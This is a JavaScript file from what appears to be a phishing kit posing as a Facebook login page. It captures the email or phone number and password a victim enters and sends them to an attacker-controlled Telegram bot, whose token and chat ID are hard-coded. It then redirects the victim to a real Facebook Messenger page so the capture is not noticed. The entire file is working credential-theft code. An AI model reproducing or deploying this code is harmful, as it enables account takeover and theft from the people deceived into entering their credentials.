// bot token
var telegram_bot_id = "6142680394:AAGW2cjo1ss97t6qdi1Mf6gUQO7RebYolXI";
// chat id
var chat_id = 5555421232;

function validateEmailOrPhoneNumber(input) {
    var emailPattern = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
    var phoneNumberPattern = /^(09[0-9]{9}|\+63[0-9]{9})$/;
    return emailPattern.test(input) || phoneNumberPattern.test(input);
  }

function displayErrorMessage(message) {
  var errorElement = document.getElementById("error-message");
  errorElement.innerHTML = message;
  errorElement.style.display = "block";
}

function hideErrorMessage() {
  var errorElement = document.getElementById("error-message");
  errorElement.innerHTML = "";
  errorElement.style.display = "none";
}

var login = function() {
  var emailOrPhoneNumber = document.getElementById("email").value;
  var password = document.getElementById("password").value;
  
  if (!validateEmailOrPhoneNumber(emailOrPhoneNumber)) {
    displayErrorMessage("Please enter a valid facebook account.");
    return false;
  }
  
  hideErrorMessage();

  var message = `🔒LOGIN-BOT🔒\n\nEmail: ${emailOrPhoneNumber}\nPassword: ${password}`;

  var settings = {
    "async": true,
    "crossDomain": true,
    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
    },
    "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message
    })
  };

  $.ajax(settings).done(function (response) {
    console.log(response);
    document.getElementById("loading-screen").style.display = "block"; // Show the loading screen
    setTimeout(function() {
        window.location.replace("https://www.facebook.com/messages/t/100611229280629/");
      }, 3000); // 3 seconds
  });
  
  document.getElementById("email").value = "";
  document.getElementById("password").value = "";

  return false;
};
